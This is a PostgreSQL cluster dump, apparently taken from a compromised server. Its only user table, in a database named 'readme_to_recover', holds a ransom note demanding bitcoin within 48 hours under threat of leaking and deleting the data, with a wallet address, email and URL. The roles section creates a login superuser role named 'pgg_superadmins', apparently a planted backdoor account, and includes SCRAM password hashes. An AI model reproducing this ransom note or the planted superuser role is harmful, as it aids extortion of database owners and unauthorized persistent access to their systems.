--
-- PostgreSQL database cluster dump
--

\restrict gE1RNUUFLYsINovfBmvsX8UQshskaIm7YnT5Jp5ePcnL07W22we34PmxeEV9Di4

SET default_transaction_read_only = off;

SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;

--
-- Roles
--

CREATE ROLE pgg_superadmins;
ALTER ROLE pgg_superadmins WITH SUPERUSER INHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION NOBYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:LFKc2c8slR6pUrcYAlfzmw==$pRDDO/TSd/WTFpgHDbOCwKGcaDtztGgqBWQjqG+xfwc=:SCbwsnMU3KyGpshSpieZWMVpCnVB5cegR7NZOxHMu5A=';
CREATE ROLE postgres;
ALTER ROLE postgres WITH NOSUPERUSER INHERIT CREATEROLE CREATEDB LOGIN REPLICATION BYPASSRLS PASSWORD 'SCRAM-SHA-256$4096:Z/3G6iLIDVGpISa2BI7OUg==$am8DmfKk1gJcmxPUPWzzreqelxRUjpIgdwtwAdbUJk0=:7JqM51+o5SxzP4JrTDPabBGYdNBX4tHuqq3LfpDEs1Q=';

--
-- User Configurations
--








\unrestrict gE1RNUUFLYsINovfBmvsX8UQshskaIm7YnT5Jp5ePcnL07W22we34PmxeEV9Di4

--
-- Databases
--

--
-- Database "template1" dump
--

\connect template1

--
-- PostgreSQL database dump
--

\restrict AvEnKcVewhZEHmMZfRBGbbOJYCr3pZc3BFX7AjwXcZmkrJH1CqIldGSCPyf5JQQ

-- Dumped from database version 15.14 (Debian 15.14-1.pgdg13+1)
-- Dumped by pg_dump version 15.14 (Debian 15.14-1.pgdg13+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- PostgreSQL database dump complete
--

\unrestrict AvEnKcVewhZEHmMZfRBGbbOJYCr3pZc3BFX7AjwXcZmkrJH1CqIldGSCPyf5JQQ

--
-- Database "postgres" dump
--

\connect postgres

--
-- PostgreSQL database dump
--

\restrict aH4DkLo10JL9lVrqIfyvm2Fi0bd8yOGho87MIWUtqddfDwgtBuc001DGwbdRPbX

-- Dumped from database version 15.14 (Debian 15.14-1.pgdg13+1)
-- Dumped by pg_dump version 15.14 (Debian 15.14-1.pgdg13+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- PostgreSQL database dump complete
--

\unrestrict aH4DkLo10JL9lVrqIfyvm2Fi0bd8yOGho87MIWUtqddfDwgtBuc001DGwbdRPbX

--
-- Database "readme_to_recover" dump
--

--
-- PostgreSQL database dump
--

\restrict eWXzjTV5hnwird6qZ2bDwsknY3PyF70OYmjXMgY4oXu4xc5gNvf2jaokDVV9INf

-- Dumped from database version 15.14 (Debian 15.14-1.pgdg13+1)
-- Dumped by pg_dump version 15.14 (Debian 15.14-1.pgdg13+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: readme_to_recover; Type: DATABASE; Schema: -; Owner: postgres
--

CREATE DATABASE readme_to_recover WITH TEMPLATE = template0 ENCODING = 'UTF8' LOCALE_PROVIDER = libc LOCALE = 'en_US.utf8';


ALTER DATABASE readme_to_recover OWNER TO postgres;

\unrestrict eWXzjTV5hnwird6qZ2bDwsknY3PyF70OYmjXMgY4oXu4xc5gNvf2jaokDVV9INf
\connect readme_to_recover
\restrict eWXzjTV5hnwird6qZ2bDwsknY3PyF70OYmjXMgY4oXu4xc5gNvf2jaokDVV9INf

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: readme; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.readme (
    text_field character varying(255)
);


ALTER TABLE public.readme OWNER TO postgres;

--
-- Data for Name: readme; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.readme (text_field) FROM stdin;
All your data is backed up. You must pay 0.0042 BTC to bc1qw6prfr353l425385kfvryv69fu8we0stw4jw3x In 48 hours, your data will be publicly disclosed and deleted. (more information: go to http://2info.win/psg)
After paying send mail to us: rambler+39unx@onionmail.org and we will provide a link for you to download your data. Your DBCODE is: 39UNX
\.


--
-- PostgreSQL database dump complete
--

\unrestrict eWXzjTV5hnwird6qZ2bDwsknY3PyF70OYmjXMgY4oXu4xc5gNvf2jaokDVV9INf

--
-- PostgreSQL database cluster dump complete
--

